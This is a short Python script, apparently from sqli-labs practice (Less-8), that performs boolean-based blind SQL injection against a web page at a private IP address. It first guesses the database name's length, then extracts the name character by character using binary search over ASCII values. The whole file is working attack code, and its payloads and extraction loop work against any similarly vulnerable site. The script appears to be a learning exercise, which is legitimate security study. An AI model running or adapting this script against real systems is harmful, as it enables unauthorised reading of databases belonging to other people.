import requests
url = "http://10.63.24.160:8080/Less-8/"
def is_true(payload):
    r = requests.get(url,params={"id":payload},timeout=5)
    #显位
    return "You" in r.text

def db_len():
    for length in range(1,20):
        #显位
        if is_true(f"1' and length(database()) = {length} -- -"):
            return length
    print("未检测到注入点")
def db_name_ser(length):
    db_name=""
    for pos in range(1,length+1):
        lo,hi = 32,126
        while lo<hi:
            mid = (lo+hi+1)//2
            #显位
            if(is_true(f"1' and ascii(substr(database(),{pos},1)) >= {mid} -- -")):
                lo = mid
            else:
                hi = mid-1
        db_name+=chr(lo)
        print(f"第{pos}位：{chr(lo)}->当前结果：{db_name}")
    return db_name

db_length = db_len()
print(f"数据库长度为:{db_length}")
print(f"数据库名为：{db_name_ser(db_length)}")
    
#security